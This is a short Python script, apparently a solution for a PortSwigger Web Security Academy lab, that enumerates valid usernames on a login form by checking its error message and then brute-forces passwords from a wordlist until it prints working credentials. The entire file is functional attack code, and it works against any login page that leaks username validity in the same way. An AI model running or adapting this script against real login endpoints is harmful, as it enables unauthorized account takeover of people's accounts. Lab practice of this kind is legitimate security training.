import requests
import sys

def check_username(url, username, length):

    data = f"username={username}&password=test"

    response = requests.post(url, data=data)

    length_resp = len(response.content.decode())
    # print(length_resp)
    # print(response.content.decode())

    c = response.content.decode()
    # print(c)
    # print(response.elapsed.total_seconds())

    return 'Invalid username or password.' not in c


def check_password(url, username, password):

    data = f"username={username}&password={password}"
    response = requests.post(url, data=data)

    return 'Invalid username or password' not in response.content.decode()


def main():

    login_url = 'https://acd31f011fcdf2e6c031238e00af00f7.web-security-academy.net/login'
    users_file = 'usernames.txt'
    users = [x.strip() for x in open(users_file).readlines()]
    pass_file = 'passwords.txt'
    passwords = [x.strip() for x in open(pass_file).readlines()]

    user_enum_resp_length = check_username(login_url, "random_non_existent_user23424343", None)
    print(f"[+] Length of the response when using a random username: {user_enum_resp_length}")

    for user in users:

        # print(f"[+] Trying username: {user}")

        if check_username(login_url, user, user_enum_resp_length):

            print(f"[+] Found username: {user}")

            for password in passwords:

                # print(f"[+] Trying credentials: {user}:{password}")
                if check_password(login_url, user, password):

                    print(f"[+] Found password for user '{user}': '{password}'")
                    sys.exit(0)


if __name__ == '__main__':
    main()
